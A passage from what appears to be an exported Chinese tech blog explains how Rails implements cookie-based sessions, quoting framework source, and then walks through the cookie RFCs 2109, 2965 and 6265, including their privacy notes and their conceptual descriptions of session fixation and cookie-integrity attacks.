序列化之後的結果是views|i:5;了。|拿來分隔 key 跟 value，i 代表著型態，5 代表實際的數字，; 則是結束符號。 以上就是 PHP Session 機制的相關原始碼分析，我們稍微看了如何產生 sessionID 以及 session information 如何做序列化。也知道了以預設的狀態來說，cookie 名稱會叫做 PHPSESSID，而且會以檔案的方式來儲存 session 的內容。 最後來分享兩個跟 PHP Session 有關的文章，都十分有趣： HITCON CTF 2018 - One Line PHP Challenge [Web Security] 透過 LFI 引入 PHP session 檔案觸發 RCE Rails（5.2 版本） Rails 是一個 Ruby 的 Web 框架，俗稱 Ruby on Rails。會挑這一套是因為我本來就知道它儲存 session 的方法不太一樣。我當初只是好奇 Rails 怎麼生成 sessionID 的，於是就去 GitHub 的 repo 搜尋：session，然後找到這個檔案：rails/actionpack/test/dispatch/session/cookie_store_test.rb，是個測試，但有時候測試其實對找程式碼幫助也很大，因為裡面會出現一堆相關的 function 跟參數。 我那時觀察了一陣子，發現裡面出現了很多次的 session_id，於是就改用這個關鍵字搜尋，找到了 rails/actionpack/lib/action_dispatch/middleware/session/cookie_store.rb，發現裡面的註解把 Rails 的 Session 實作方式寫得一清二楚： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# This cookie-based session store is the Rails default. It is# dramatically faster than the alternatives.## Sessions typically contain at most a user_id and flash message; both fit# within the 4K cookie size limit. A CookieOverflow exception is raised if# you attempt to store more than 4K of data.## The cookie jar used for storage is automatically configured to be the# best possible option given your application's configuration.## If you only have secret_token set, your cookies will be signed, but# not encrypted. This means a user cannot alter their +user_id+ without# knowing your app's secret key, but can easily read their +user_id+. This# was the default for Rails 3 apps.## Your cookies will be encrypted using your apps secret_key_base. This# goes a step further than signed cookies in that encrypted cookies cannot# be altered or read by users. This is the default starting in Rails 4.## Configure your session store in &lt;tt&gt;config/initializers/session_store.rb&lt;/tt&gt;:## Rails.application.config.session_store :cookie_store, key: '_your_app_session'## In the development and test environments your application's secret key base is# generated by Rails and stored in a temporary file in &lt;tt&gt;tmp/development_secret.txt&lt;/tt&gt;.# In all other environments, it is stored encrypted in the# &lt;tt&gt;config/credentials.yml.enc&lt;/tt&gt; file.## If your application was not updated to Rails 5.2 defaults, the secret_key_base# will be found in the old &lt;tt&gt;config/secrets.yml&lt;/tt&gt; file.## Note that changing your secret_key_base will invalidate all existing session.# Additionally, you should take care to make sure you are not relying on the# ability to decode signed cookies generated by your app in external# applications or JavaScript before changing it.## Because CookieStore extends Rack::Session::Abstract::Persisted, many of the# options described there can be used to customize the session cookie that# is generated. For example:## Rails.application.config.session_store :cookie_store, expire_after: 14.days## would set the session cookie to expire automatically 14 days after creation.# Other useful options include &lt;tt&gt;:key&lt;/tt&gt;, &lt;tt&gt;:secure&lt;/tt&gt; and# &lt;tt&gt;:httponly&lt;/tt&gt;. Rails 預設使用 cookie-based session，因為它比其他解決方案都來得快。雖然 cookie 有大小限制，但頂多只會存 flash message 跟 user_id，離 4k 的上限還有一大段距離。 在 Rails 3 裡面 cookie 只會被 signed 不會被加密，意思就是使用者看得到 user_id 但沒辦法改它（就像我們在 express-session 看到的 sessionID 一樣，看得到但不能改）。 而 Rails 4 以後預設就會把 cookie 的值整個加密，什麼都看不到。在測試環境時 Rails 會自動幫你產生一個 secret 來加密，也可以透過 Rails 的設定檔來設定。 在這份檔案中也可以看到有一個 function 叫做generate_sid，是拿來產生 sessionID 的。這個 function 存在於 rails/actionpack/lib/action_dispatch/middleware/session/abstract_store.rb： 12345def generate_sid sid = SecureRandom.hex(16) sid.encode!(Encoding::UTF_8) sidend 直接呼叫了 Ruby 的函式庫 SecureRandom 來產生亂數並當作 sessionID。 至於在 Cookie 裡面的 key 是什麼，可以經由設定 app.config.session_store 來調整。根據這邊的程式碼： 1234567# Setup default session store if not already set in config/application.rbinitializer :setup_default_session_store, before: :build_middleware_stack do |app| unless app.config.session_store? app_name = app.class.name ? app.railtie_name.chomp(\"_application\") : \"\" app.config.session_store :cookie_store, key: \"_#&#123;app_name&#125;_session\" endend 預設值會是 _#{app_name}_session，例如說我的 app_name 叫做 huli，Cookie 名稱就會是 _huli_session。 然後把 session information 實際寫進去 cookie 的地方在 rails/actionpack/lib/action_dispatch/middleware/session/cookie_store.rb： 1234567891011def set_cookie(request, session_id, cookie) cookie_jar(request)[@key] = cookieenddef get_cookie(req) cookie_jar(req)[@key]enddef cookie_jar(request) request.cookie_jar.signed_or_encryptedend 會呼叫與 cookie 相關的 signed_or_encrypted 來做處理。 接著我去搜了一下文件，發現其實官方文件都寫得十分清楚了： The session ID is generated using SecureRandom.hex which generates a random hex string using platform specific methods (such as OpenSSL, /dev/urandom or Win32 CryptoAPI) for generating cryptographically secure random numbers. Currently it is not feasible to brute-force Rails’ session IDs. 上面這段寫了 sessionID 的產生方式。 The CookieStore uses the encrypted cookie jar to provide a secure, encrypted location to store session data. Cookie-based sessions thus provide both integrity as well as confidentiality to their contents. The encryption key, as well as the verification key used for signed cookies, is derived from the secret_key_base configuration value. As of Rails 5.2 encrypted cookies and sessions are protected using AES GCM encryption. This form of encryption is a type of Authenticated Encryption and couples authentication and encryption in single step while also producing shorter ciphertexts as compared to other algorithms previously used. The key for cookies encrypted with AES GCM are derived using a salt value defined by the config.action_dispatch.authenticated_encrypted_cookie_salt configuration value. 這段則是寫說從 Rails 5.2 開始採用 AES GCM 來加密，底下還有一個段落我沒複製，主要是提到之前程式碼註解裡面寫的，Rails 4 前只用 HMAC 來做驗證，而不是加密。 而且我看一看之後發現這文件寫的好棒喔，除了把這些機制說明清楚以外，底下還介紹了我們上一篇提到的 Session Fixation Attack 以及 CSRF。 若是還想深入研究，可以參考 Rails 裡面 Cookie 相關的實作：rails/actionpack/lib/action_dispatch/middleware/cookies.rb，註解裡面有詳細的說明，例如說加密的部分： 1234567891011121314151617181920# Returns a jar that'll automatically encrypt cookie values before sending them to the client and will decrypt them for read.# If the cookie was tampered with by the user (or a 3rd party), +nil+ will be returned.# # If +secret_key_base+ and +secrets.secret_token+ (deprecated) are both set,# legacy cookies signed with the old key generator will be transparently upgraded.# # If +config.action_dispatch.encrypted_cookie_salt+ and +config.action_dispatch.encrypted_signed_cookie_salt+# are both set, legacy cookies encrypted with HMAC AES-256-CBC will be transparently upgraded.# # This jar requires that you set a suitable secret for the verification on your app's +secret_key_base+.# # Example:# # cookies.encrypted[:discount] = 45# # =&gt; Set-Cookie: discount=DIQ7fw==--K3n//8vvnSbGq9dA--7Xh91HfLpwzbj1czhBiwOg==; path=/# # cookies.encrypted[:discount] # =&gt; 45def encrypted @encrypted ||= EncryptedKeyRotatingCookieJar.new(self)end 往底下追的話就可以看到 EncryptedKeyRotatingCookieJar 的完整程式碼，或你也可以再往下，看看 rails/activesupport/lib/active_support/message_encryptor.rb，負責加密的程式碼長這樣： 12345678910111213141516def _encrypt(value, **metadata_options) cipher = new_cipher cipher.encrypt cipher.key = @secret # Rely on OpenSSL for the initialization vector iv = cipher.random_iv cipher.auth_data = \"\" if aead_mode? encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options)) encrypted_data &lt;&lt; cipher.final blob = \"#&#123;::Base64.strict_encode64 encrypted_data&#125;--#&#123;::Base64.strict_encode64 iv&#125;\" blob = \"#&#123;blob&#125;--#&#123;::Base64.strict_encode64 cipher.auth_tag&#125;\" if aead_mode? blobend 這裡的 cipher 是從 openssl 來的，所以最底層是使用了 openssl。 整理到這邊應該就差不多了，就不再繼續深入了。 總結 在這篇裡面我們看了三個不同的 Session 儲存方式。第一種是 express-session，把 session information 存在記憶體裡面；第二種是 PHP，存在檔案裡面；最後一種則是 Rails，採用了之前提過的 cookie-based session，將資訊直接加密並且存在 cookie 裡。 在這系列當中，第一篇文章我們理解了概念，第二篇利用讀 RFC 加深印象並重新理解了一次 Session，最後一篇則是直接參考一些主流框架的實作，看看我們之前所提到的 sessionID 應該如何產生，session information 應該存在哪裡，cookie-bases session 又應該如何實作。 寫這系列的初衷就是想讓大家把這些概念一次理解清楚，就不用以後每次碰到都重新查一遍。 最後，希望這系列對大家有幫助，有任何錯誤都可以在底下留言反映。 底下是系列文的完整清單： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作","link":"/2019/08/09/session-and-cookie-part3/"},{"title":"淺談 Session 與 Cookie：一起來讀 RFC","text":"前言 這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的第二篇，三篇的完整連結如下： 白話 Session 與 Cookie：從經營雜貨店開始 淺談 Session 與 Cookie：一起來讀 RFC 深入 Session 與 Cookie：Express、PHP 與 Rails 的實作 在上一篇裡面，我們提到了 Session 的意思： Session 是什麼？就是一種讓 Request 變成 stateful 的機制。以小明的例子來說，Session 就是一種讓客人之間能互相關聯起來的機制。在故事裡面我們用了紙條跟手機裡的資訊來比喻，有多種方式可以達成 Session。 其實在寫這系列的時候，「Session 最明確的定義是什麼」困擾了我一陣子，而且我到現在還不能完全肯定到底怎樣才是對的。在我心中有兩個解釋都滿合理的，第一個解釋就是上一篇跟大家講的，Session 是一種讓 Request 變成 stateful 的「機制」，而 Session 的第二種解釋（也是比較貼近英文原文的解釋），就是「具有狀態的一段期間」，或者是「上下文」，所以在 Session 裡面的東西可以放在一起看。 有一種說法認為 Session 的原意的確是第二種，但是在 Web 領域中 Session 轉變成了一種「機制」，所以兩個意思都通。但我自己其實是比較傾向第二種才是唯一正確的解釋方法，從頭到尾第二種都是對的，第一種則是誤解。 舉個例子來說，如果你有用過 Google Analytics，裡面有個名詞叫做「工作階段」，英文原名就叫做 Session，而 Google 對 Session 的解釋是這樣的： （來源：Analytics (分析) 定義網頁工作階段的方式） 它把 Session 定義為「指定期間內在網站上發生的多項使用者互動」，並且說可以把 Session 當作一個容器（Container）。雖然說 Google Analytics 的 Session 跟 Web 技術上所使用的 Session 本來就不同，但我認為多少可以互相參考。而這個 Session 的定義與我前面所說的「具有狀態的一段期間」或者是「上下文」其實是雷同的。 那為什麼儘管我比較偏向這個定義，卻在上一篇裡面隻字不提，還把 Session 定義成我眼中的「誤解」？ 第一個原因是搞不好兩種解釋都說得通，所以有可能兩個都是對的。第二個原因是我所認為的 Session 精確定義非常不好解釋，因為概念太抽象了。我認為若是提了這個解釋，只會把你對 Session 的理解越搞越亂，因此上一篇才沒有提到這個。第三個原因是我認為解釋成機制也可以，而且比較好理解，就算它真的是錯誤的，造成的影響也沒那麼大。 總之呢，我認為對完全沒有基礎的人來說，把 Session 理解成一種機制就可以了。但是對於像我這種想要追根究底的人來說，我想知道的是最正確的理解，而且必須是有憑有據的。 要怎樣才叫做有憑有據呢？去看當年談論 Cookie 與 Session 的 RFC 文件應該夠有憑有據了吧？RFC 文件可是要經歷過一系列討論與審核之後才能誕生，我想不到有哪邊的解釋能比 RFC 更具有說服力。 在這篇文章中我們會來稍微讀一下三份 RFC： RFC 2109 RFC 2965 RFC 6265 為什麼要讀三份呢？因為這三份都是跟 Cookie 相關的文件，2109 是最早的一份，後來出現一些問題所以被新的 2965 取代，過了十年後有了 6265，是目前最新的標準。 我認為讀東西從最早期的時候開始讀能夠事半功倍，因為東西應該會最少，理解上也比較容易，找資料也好找。例如說要讀 React 原始碼我會推薦從最早的 0.xx 版本開始讀，讀 ECMAScript 也可以從 ES3 開始，還可以順便知道演進的過程。 前情提要大概就到這邊了，本文的目標就是來讀 RFC，看看裡面是怎麼說 Cookie 與 Session 的。裡面我會對原文做一些翻譯，但畢竟翻譯是項專業，我翻的很差而且一定有錯誤，拜託大家還是要看原文，翻譯只能當作輔助。如果有哪邊錯的很離譜歡迎指出，我會十分感謝。 RFC 2109 RFC 2109 發佈於 1997 年 2 月，那是個還沒有 Ajax 的年代，是個 Netscape 還稱霸瀏覽器市場的年代。 這份文件的標題叫做：「HTTP State Management Mechanism」，直翻就是 HTTP 狀態管理機制。 先來看摘要的部分： This document specifies a way to create a stateful session with HTTP requests and responses. It describes two new headers, Cookie and Set-Cookie, which carry state information between participating origin servers and user agents. The method described here differs from Netscape’s Cookie proposal, but it can interoperate with HTTP/1.0 user agents that use Netscape’s method. (See the HISTORICAL section.) 這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法，並介紹了兩個新的 header：Cookie 跟 Set-Cookie，藉由這兩個 header 在 server 與 user agent（通常就是指瀏覽器）之間傳遞資訊。這邊所提到的方法與 Netscape 的 Cookie 提案不同，但可以互相兼容。 （每次翻譯翻一翻就會不想翻了…因為總覺得自己翻譯得不夠精確，翻譯真滴難） 摘要寫得很明確了，簡單來說就是引入 Cookie 與 Set-Cookie 兩個 Header 來建立 Session。會特別提到 Netscape 是因為 Cookie 這東西最早是 Netscape 自己實作的，只可惜我能找到的連結都死掉了，無緣看到 Netscape 的 Cookie 規範長什麼樣子。 再來第二個部分 TERMINOLOGY 就是規定一些專有名詞的用法，可以稍微掃過去就好，重點在第三個部分 STATE AND SESSIONS： This document describes a way to create stateful sessions with HTTP requests and responses. Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a “session”. 這份文件規定了一種利用 HTTP request 與 response 建立有狀態的 session 的方法。目前 HTTP 伺服器獨立回應每一個 Request，不把它與其他 Request 關聯，而這個方法允許想要交換狀態資訊的 Server 與 Client 把 HTTP Request 與 Response 放在一個更大的 context 底下，我們稱之為一個 session。（這段我覺得超級難翻…而且一定翻得不好） This context might be used to create, for example, a “shopping cart”, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a user’s previous reading affects which offerings are presented. 舉例來說，這個 context 可以用來建立購物車的功能，在購買前可以知道使用者選了哪些物品，或者是雜誌瀏覽系統，從以前讀過的東西推薦可能喜歡的內容。 這邊對於 Session 的定義就如同我前面所講的那樣，Session 是「具有狀態的一段期間」，或者是「上下文」，就是上面所提到的 context，在這個 context 裡面的 Request 與 Response 可以放在一起看，於是他們之間就有了狀態。 There are, of course, many different potential contexts and thus many different potential types of session. The designers’ paradigm for sessions created by the exchange of cookies has these key attributes: Each session has a beginning and an end. Each session is relatively short-lived. Either the user agent or the origin server may terminate a session. The session is implicit in the exchange of state information. 有很多種不同型態的 session，而藉由交換 cookie 所建立的 session 有幾個重點： 每個 session 都有開始與結束 每個 session 都是相對短暫的 瀏覽器或伺服器任何一方都可以終止這個 session Session 蘊含了交換狀態資訊的概念在裡面 這邊就是稍微介紹了一下 Session 的特性而已。若是我們把 Session 理解為是一種「機制」，那該如何解釋上面的段落？「每個 Session 機制都是相對短暫的」？，聽起來有點怪怪的，所以這也是為什麼我會說 Session 當作機制來解有一點奇怪。 接下來第四個章節很多部分都是在講那些 Header 的規格，這邊我們跳過不看，只節選幾個我認為比較重要的段落出來： 4.2.1 General The origin server initiates a session, if it so desires. (…) &gt; To initiate a session, the origin server returns an extra response header to the client, Set-Cookie. (The details follow later.) A user agent returns a Cookie request header (see below) to the origin server if it chooses to continue a session. 如果 Server 需要的話，它可以初始化一個 session，而初始化的方法是回傳一個 Set-Cookie 的 Header，若是瀏覽器決定繼續這個 session 的話，可以回傳 Cookie 這個 Header 簡單來說就是你把伺服器把狀態放在 Set-Cookie 這個 Header 裡面送去瀏覽器，而瀏覽器在之後的 Request 把 Cookie 帶上去，這樣子就成立一個 Session 了，因為後續的 Request 就有了狀態。 再來可以看一下第五個章節 EXAMPLES 的部分，我們來看其中一個例子，這邊的例子比較簡單，我就直接翻中文了，想看原文可以到這裡：5.1 Example 1。 第一步：瀏覽器 -&gt; 伺服器 12POST /acme/login HTTP/1.1[form data] 使用者透過表單登入。 第二步：伺服器 -&gt; 瀏覽器 12HTTP/1.1 200 OKSet-Cookie: Customer=&quot;WILE_E_COYOTE&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot; 登入成功，伺服器發送 Set-Cookie Header 並設置資訊，儲存了使用者的身份。 第三步：瀏覽器 -&gt; 伺服器 123POST /acme/pickitem HTTP/1.1Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;[form data] 使用者把某個物品加入購物車。 第四步：伺服器 -&gt; 瀏覽器 12HTTP/1.1 200 OKSet-Cookie: Part_Number=&quot;Rocket_Launcher_0001&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot; 伺服器再設置一個 Cookie 來儲存剛剛加入購物車的東西。 第五步：瀏覽器 -&gt; 伺服器 12345POST /acme/shipping HTTP/1.1Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;; Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot; [form data] 使用者利用表單選擇商品的運送方式。 第六步：伺服器 -&gt; 瀏覽器 12HTTP/1.1 200 OKSet-Cookie: Shipping=&quot;FedEx&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot; 設置新的 Cookie 來儲存運送方式。 第七步：瀏覽器 -&gt; 伺服器 123456POST /acme/process HTTP/1.1Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;; Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot; Shipping=&quot;FedEx&quot;; $Path=&quot;/acme&quot; [form data] 使用者選擇結帳。 第八步：伺服器 -&gt; 瀏覽器 1HTTP/1.1 200 OK 根據瀏覽器帶上來的 Cookie 得知用戶資料、購買品項以及運送方式，交易完成！ 上面這個範例大致說明了 Cookie 的運作方式，就是透過伺服器傳送 Set-Cookie 這個 header 來設置資訊，並且靠瀏覽器傳送 Cookie header 把之前儲存的資訊一併帶上來，這樣子就有了狀態，就開啟了一段 Session。 接著來看第六部分：IMPLEMENTATION CONSIDERATIONS，講到實作上的一些考量，這邊一樣截取片段： 6.1 Set-Cookie Content The session information can obviously be clear or encoded text that describes state. However, if it grows too large, it can become unwieldy. Therefore, an implementor might choose for the session information to be a key to a server-side resource. Of course, using a database creates some problems that this state management specification was meant to avoid, namely: keeping real state on the server side; how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting. 存在 cookie 裡的 session 資訊可以是明文或是編碼過後的文字，但如果存的東西太多會變得太笨重。所以，你可以選擇只在 session 資訊裡放一個對應到伺服器資源的 key。但這種方式會造成一些這個狀態管理機制本來就想避免掉的一些問題，主要是： 把狀態放在 server 如何以及何時把沒有用的狀態資訊清掉 其實這種方式就是我們在上一篇所提到的兩個不同的方法：Cookie-based session 以及 SessionID，前者的缺點就是存太多東西會變得笨重，後者則是需要把狀態放在 Server。 兩種方式其實各有優劣，但比較常使用的還是 SessionID 那種方式，也就是原文提到的：「session information to be a key to a server-side resource」。 好，其他都是有關安全性或是跟隱私有關的部分，跟我們這篇要談的議題有點差異，因此我就不特別提了。 讓我們先來整理一下上面所看到的東西。 首先，Cookie 就是為了要建立 Session 而生的，因為在這之前要建立 Session 只能透過我上一篇提到的那些方式，例如說用網址列帶資訊，或者是在 form 裡面放一個 hidden 的欄位。為了簡化這些行為才有了 Cookie。 而實際方式就是 Server 回傳 Set-Cookie 的 header，User agent 把這些資訊儲存起來之後，在後續的 Request 都加上一個 Cookie header，這就是我們上一篇中所提到的「紙條」，每次都會帶著這個紙條，就讓 Request 之間有了狀態。 至於要在 Cookie 裡放什麼狀態都行，但如果放的東西太多可以考慮把這些狀態移到 Server 去，只在 Cookie 裡放一個可以對應的 ID。這就是我們之前所說的 Session ID 與 Session Data。 RFC 2965 RFC 2965 誕生於 2000 年，不過它的內容跟 RFC 2109 其實相去不遠，大概有八成的內容都是一樣的。 為什麼呢？ 在 RFC 2109 出來之後不久他們發現了 IE3 與 Netscape Navigator3 對於這份「新的」Cookie 標準（舊的指的是 Netscape 原本自己的那套規範）實作不同，例如說以下這一段： 1234Set-cookie: xx=&quot;1=2\\&amp;3-4&quot;;Comment=&quot;blah&quot;;Version=1; Max-Age=15552000; Path=/;Expires=Sun, 27 Apr 1997 01:16:23 GMT 在 IE 裡面會把 Cookie 設置成這樣：Cookie: Max-Age=15552000，在 Netscape Navigator 裡面則是我們預期的：Cookie: xx=&quot;1=2\\&amp;3-4&quot;.，同一段 Header 卻產生了不同的結果，於是他們就要想辦法來修正這個行為。 最後就有了 RFC 2965 的出現，解決方式是引入了兩個新的 Header：Cookie2 跟 Set-Cookie2，其餘部分都與 RFC 2109 差不多。 因此 2965 我們可以跳過不看，直接來看最新的 RFC 6265。 RFC 6265 RFC 6265 是 2011 年出現的文件，跟上一份相隔 11 年。 而這份文件可以說是把 Cookie 規則再翻新了一遍，修改的幅度很大，在 Introduction 裡面就有說明了： Prior to this document, there were at least three descriptions of cookies: the so-called “Netscape cookie specification” [Netscape], RFC 2109 [RFC2109], and RFC 2965 [RFC2965]. However, none of these documents describe how the Cookie and Set-Cookie headers are actually used on the Internet (see [Kri2001] for historical context). 在這份文件之前，至少存在著三份不同的 Cookie 規格，第一個是 Netscape 的規格，再來是 RFC 2109 以及 2965。可是沒有一份文件真的在描述現今我們如何使用 Cookie 與 Set-Cookie。 有些我們現在在用的屬性，在 RFC 2965 都是不存在的，例如說 HttpOnly。這份規範把很多東西都定義的比較明確，有興趣的讀者可以自己去看。 接著我們來看一些有趣的地方好了，第一個是 3.1 Examples，裡面提到的範例直接使用了 SessionID： 3.1. Examples Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie. For example, the server can send the user agent a “session identifier” named SID with the value 31d4d96e407aad42. The user agent then returns the session identifier in subsequent requests. 伺服器可以利用 Set-Cookie header 設置一個簡短的字串，而瀏覽器會在後續的 Request 把這個字串傳上來。舉例來說，伺服器可以傳送一個「session identifier」稱之為 SID，內容是 31d4d96e407aad42，而瀏覽器就會在之後的 Request 把這個 sessionID 傳上來。 底下還有提供更完整的範例，但有點長我就不翻了。其實我很推薦大家自己把這整份文件都看完，因為這整份文件定義的就是現在我們在使用的 Cookie 規格（基本上是啦，雖然還是有一點出入），你可以從規格裡面知道最正確的資訊。 例如說： 4.1.2.5. The Secure Attribute The Secure attribute limits the scope of the cookie to “secure” channels (where “secure” is defined by the user agent). When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]). Secure 這個屬性限制了 Cookie 只能在「安全」的管道上傳輸（安全的定義由 user agent 自己定義）。當一個 Cookie 有了 Secure 這個屬性，只有當 Request 在安全的管道（通常指的是 TLS）中傳輸時才會把 cookie 放進 HTTP Request 裡面。 這邊我們就可以看到規格與實作的差異。規格只說了「什麼是安全由 user agent 自己定義」，而沒有強制規範說「一定要在 HTTPS 的時候才能傳輸」。所以一般我們所認知的「Secure 就是代表一定要 HTTPS 才會被傳送」其實指的是主流瀏覽器的實作，而不是 RFC 的規範。 所以如果想完整回答「設置 Secure 屬性代表什麼」這個問題，可以這樣回答： 代表這個 Cookie 只能透過 secure 的管道被傳輸，至於什麼是 secure，RFC 上寫說由瀏覽器自行定義。依據目前主流的實作，就是指只能透過 HTTPS 來傳送 再來我們來看跟我們切身相關的一個東西： 7.Privacy Considerations Cookies are often criticized for letting servers track users. For example, a number of “web analytics” companies use cookies to recognize when a user returns to a web site or visits another web site. Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts. Cookie 因為可以被用來追蹤使用者而飽受批評。舉例來說，很多在做 web analytics 的公司用 cookie 來辨認用戶造訪了哪些網站。雖然 cookie 不是唯一能追蹤使用者的技術，但因為它可以在不同 host 被共享的特性，的確促進了這種追蹤的行為。 7.1. Third-Party Cookies Particularly worrisome are so-called “third-party” cookies. In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks). These third-party servers can use cookies to track the user even if the user never visits the server directly. For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites. 最令人擔心的就是第三方 cookie。在渲染 HTML 頁面時，瀏覽器常會發送一些 Request 去其他的 Server（例如說廣告商的伺服器），所以儘管這些使用者從來沒有直接造訪這些網站，這些網站可以利用 Cookie 來追蹤使用者。舉例來說，使用者造訪了有跟某廣告商合作的 A 網站，然後又去了跟同個廣告商有合作的 B 網站，廣告商就可以在這兩個網站之間追蹤使用者。 Some user agents restrict how third-party cookies behave. For example, some of these user agents refuse to send the Cookie header in third-party requests. Others refuse to process the Set-Cookie header in responses to third-party requests. User agents vary widely in their third-party cookie policies. This document grants user agents wide latitude to experiment with third-party cookie policies that balance the privacy and compatibility needs of their users. However, this document does not endorse any particular third-party cookie policy. 有些瀏覽器會限制第三方 Cookie。舉例來說，有些不發送 Cookie header 給第三方，有些則是不處理第三方的 Set-Cookie header。每一個瀏覽器對於第三方 cookie 的處理方式都不太一樣，而這份文件給了瀏覽器很大的空間去實驗什麼是對使用者最好的策略，試圖在隱私與兼容性之間取得一個平衡。然而，這份文件不會認可任何一個特定的第三方 cookie 處理方式。 Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users. In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs. 如果 Server 用一些 workaround 追蹤使用者的話，阻擋第三方 cookie 的策略其實不是那麼有用。例如說他們可以把資訊附加在 URL 上面來追蹤用戶，而不透過 Cookie。 其實當初在 RFC 2109 就有談論過第三方 cookie 的議題，只是那時候叫做 Unverifiable Transactions，看到的時候我有嚇了一跳，在 1997 年剛有 cookie 的時候就已經提到了第三方 cookie 的問題。 畢竟這個問題感覺在近期才比較被廣泛討論，而且在近幾年 Safari 跟 Firefox 才預設阻擋第三方 cookie。甚至連 Facebook 之後的解法 dynamic URLs 都早已出現在 RFC 6265 上面（我超討厭那串 fbcid…）。 最後我們來看一些跟安全性相關的東西，都在 8.Security Considerations 裡面： 8.4. Session Identifiers Instead of storing session information directly in a cookie (where it might be exposed to or replayed by an attacker), servers commonly store a nonce (or “session identifier”) in a cookie. When the server receives an HTTP request with a nonce, the server can look up state information associated with the cookie using the nonce as a key. 比起把 session 資訊直接存在 cookie 裡面，server 通常只在 cookie 裡面存一個 sessionID，當 server 收到這個 sessionID 的時候就能夠找到相對應的資料。 Using session identifier cookies limits the damage an attacker can cause if the attacker learns the contents of a cookie because the nonce is useful only for interacting with the server (unlike non- nonce cookie content, which might itself be sensitive). Furthermore, using a single nonce prevents an attacker from “splicing” together cookie content from two interactions with the server, which could cause the server to behave unexpectedly. 跟直接把敏感資訊存在 cookie 比起來，只存 sessionID 能夠侷限攻擊者所能造成的傷害，因為就算攻擊者知道裡面存了 sessionID 也沒什麼用。（splicing 那段看得不是很懂） Using session identifiers is not without risk. For example, the server SHOULD take care to avoid “session fixation” vulnerabilities. A session fixation attack proceeds in three steps. First, the attacker transplants a session identifier from his or her user agent to the victim’s user agent. Second, the victim uses that session identifier to interact with the server, possibly imbuing the session identifier with the user’s credentials or confidential information. Third, the attacker uses the session identifier to interact with server directly, possibly obtaining the user’s authority or confidential information. 使用 sessionID 也不是完全沒有風險。舉例來說，server 應該要避免 session fixation 這種攻擊方法。這種攻擊方法有三個步驟，第一個步驟是先產生一個 sessionID，並且把這 ID 傳給受害者；第二步是受害者用這個 sessionID 來登入；在受害者登入以後，攻擊者就能夠使用同樣的 sessionID 取得受害者的資料。 原文對固定 Session（Session fixation）的說明沒有很清楚，有興趣的朋友可以參考 HTTP Session 攻擊與防護，這篇講得比較清楚一點。 簡單來說就是讓受害者用你指定的 sessionID 登入，所以在 Server 端這個 sessionID 就會跟受害者的帳號綁在一起。接著你再用同樣的 sessionID，就可以用受害者的身份登入並且使用網站。 接著我們再來看另外一個安全性問題： 8.6. Weak Integrity Cookies do not provide integrity guarantees for sibling domains (and their subdomains). For example, consider foo.example.com and bar.example.com. The foo.example.com server can set a cookie with a Domain attribute of “example.com” (possibly overwriting an existing “example.com” cookie set by bar.example.com), and the user agent will include that cookie in HTTP requests to bar.example.com. In the worst case, bar.example.com will be unable to distinguish this cookie from a cookie it set itself. The foo.example.com server might be able to leverage this ability to mount an attack against bar.example.com. Cookies 對 subdomain 並不具有完整性。舉例來說，foo.example.com 可以對 example.com 設置 cookie，而這個有可能把 bar.example.com 對 example.com 設置的 cookie 給蓋掉。最糟的情況下，當 bar.example.com 收到這個 cookie 時，區分不出是自己設置的還是別人設置的。foo.example.com 就可以利用這個特性來攻擊 bar.example.com。 An active network attacker can also inject cookies into the Cookie header sent to https://example.com/ by impersonating a response from http://example.com/ and injecting a Set-Cookie header. The HTTPS server at example.com will be unable to distinguish these cookies from cookies that it set itself in an HTTPS response. An active network attacker might be able to leverage this ability to mount an attack against example.com even if example.com uses HTTPS exclusively. 攻擊還可以利用 http://example.com/ 來把 https://example.com/（前者是 http，後者 https）的 cookie 蓋掉，server 就無法分辨這個 cookie 是 http 還是 https 設置的。攻擊者一樣可以利用這個特性來進行攻擊。 上面這一段在 4.1.2.5 The Secure Attribute 其實也有提到： Although seemingly useful for protecting cookies from active network attackers, the Secure attribute protects only the cookie’s confidentiality. An active network attacker can overwrite Secure cookies from an insecure channel, disrupting their integrity 大意就是說 Secure 屬性沒辦法保障 cookie 的完整性。攻擊者可以從 HTTP 覆蓋掉 HTTPS 的 cookie。 看到這邊的時候我心頭一驚，這個不就是在講我之前寫過的：我遇過的最難的 Cookie 問題嗎？現在我也終於知道為什麼 Safari 跟 Firefox 都沒有擋這種行為，因為在規格裡面並沒有要求你一定要擋。 至於 Chrome 的話，它的實作參考了幾個不同的 RFC，在負責管理 Cookie 的 CookieMonster 裡面有寫到： CookieMonster requirements are, in theory, specified by various RFCs. RFC 6265 is currently controlling, and supersedes RFC 2965. However, most browsers do not actually follow those 